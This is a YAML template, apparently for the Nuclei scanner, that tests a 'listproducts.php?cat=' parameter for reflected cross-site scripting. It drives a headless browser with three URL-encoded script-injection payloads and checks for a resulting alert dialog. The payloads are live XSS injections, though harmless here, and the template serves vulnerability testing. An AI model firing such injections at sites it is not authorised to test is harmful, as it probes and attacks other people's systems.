headless:
- attack: batteringram
  matchers:
  - condition: or
    dsl:
    - reflected_cat_query == true
    - contains(reflected_cat_query_message, '7')
    - contains(reflected_cat_query_message, '2')
    - contains(reflected_cat_query_message, '10')
    type: dsl
  payloads:
    payload:
    - '%3C%2Fscript%3E%3Cscript%3Ealert%283%2B4%29%3C%2Fscript%3E'
    - '%3C%2Fscript%3E%3Cscript%3Ealert%281%2B1%29%3C%2Fscript%3E'
    - '%3C%2Fscript%3E%3Cscript%3Ealert%289%2B1%29%3C%2Fscript%3E'
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}/listproducts.php?cat=1{{payload}}'
  - action: waitdialog
    name: reflected_cat_query
id: headless-reflected-xss-2
info:
  author: yar0v1t
  description: 'A cross-site scripting (XSS) vulnerability with headless mode and
    batteringram attack.

    '
  name: Reflected Headless XSS With Batteringram Attack
  severity: high
